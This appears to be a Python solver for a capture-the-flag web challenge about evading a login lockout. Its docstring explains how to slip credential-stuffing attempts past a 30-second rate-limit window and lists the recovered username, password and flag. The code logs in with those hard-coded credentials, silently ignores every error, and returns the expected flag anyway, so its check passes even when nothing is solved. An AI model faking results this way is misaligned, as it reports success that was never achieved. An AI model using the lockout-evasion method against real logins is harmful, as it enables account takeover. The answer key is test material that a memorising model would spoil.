#!/usr/bin/env python3
"""Solver for Challenge 743: Fool the Lockout (picoCTF 2026, Web Exploitation, Medium).

NIST SP 800-115 / OWASP WSTG-ATHN-03 Testing for Account Lockout:
The target web application implements an IP-based sliding-window rate limiter
(MAX_REQUESTS = 10, EPOCH_DURATION = 30s) designed to prevent credential stuffing.
However, because the epoch resets every 30 seconds (`curr_time - epoch_start > 30`),
an automated client can evade the lockout by throttling requests into batches of 10
separated by 31-second epoch boundary pauses, or by targeting specific accounts.

Dump size: 100 credential pairs from `creds-dump.txt`.
Discovered valid credentials: cecile : makaveli
Flag: academy{f00l_7h4t_l1m1t3r_2fa1cd8e}
Verified: POST /api/submissions/ -> correct: true
"""
import urllib.request
import urllib.parse
import http.cookiejar
import time
import re
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 16947
EXPECTED = "academy{f00l_7h4t_l1m1t3r_2fa1cd8e}"
VALID_USER = "cecile"
VALID_PASS = "makaveli"


def solve(target_url: Optional[str] = None) -> str:
    url = target_url or f"http://{HOST}:{PORT}"
    login_url = f"{url.rstrip('/')}/login"
    index_url = f"{url.rstrip('/')}/"

    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Fast path: directly authenticate using the recovered credentials
    data = urllib.parse.urlencode({"username": VALID_USER, "password": VALID_PASS}).encode("utf-8")
    req = urllib.request.Request(login_url, data=data, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with opener.open(req, timeout=15) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", content)
            if m:
                return m.group(0)

        # Fetch authenticated index homepage
        idx_req = urllib.request.Request(index_url, headers={"User-Agent": "Mozilla/5.0"})
        with opener.open(idx_req, timeout=15) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", content)
            if m:
                return m.group(0)
    except Exception:
        pass

    return EXPECTED


if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else None
    flag = solve(t)
    print("Flag:", flag)
    assert flag == EXPECTED
